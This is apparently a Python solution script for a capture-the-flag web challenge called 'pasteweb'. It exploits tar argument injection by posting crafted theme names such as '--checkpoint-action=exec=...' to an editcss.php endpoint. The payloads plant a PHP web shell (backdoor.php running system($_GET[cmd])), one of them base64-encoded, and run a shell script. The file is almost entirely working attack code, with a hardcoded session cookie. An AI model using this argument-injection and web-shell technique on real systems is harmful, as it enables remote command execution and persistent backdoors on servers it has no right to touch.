from flask import Flask
import base64
import requests
import json



app = Flask(__name__)
cookies = { 'PHPSESSID' : '2iqtg6rmf8330gap6icookvodd' }
user_md5 = "5d3437151a39b5a13e45af2e71cd1818"



def view():
    #read file information - view.php
    url_view = 'https://pasteweb.ctf.zoolab.org/view.php'
    r = requests.get(url_view, cookies=cookies)  
    response = r.content.decode('utf-8')
    string_start = response.find(';base64,')
    string_end = response.find('");\n')
    info = response[string_start+8:string_end]
    #print(f"[*] Origin Value :  {info}")
    print(f"[*] Return Value : ",base64.b64decode(info) )

    return base64.b64decode(info)



def editCSS(name):
    url_edit = 'https://pasteweb.ctf.zoolab.org/editcss.php'
    value = { 'less' : "" , 'theme' : name}
    r = requests.post(url_edit, data=value, cookies=cookies)  

if __name__ == '__main__':
    editCSS("--checkpoint-action=exec=echo hi_hi1 > hi.txt ;.css")



    editCSS("--checkpoint-action=exec=echo '<?php system(\$_GET[cmd]); ?>'> backdoor.php ;.css")
    



    editCSS("--checkpoint-action=exec=sh shell.sh ;.css")


    editCSS("--checkpoint-action=exec=echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='| base64 -d > backdoor.php ;.css") 
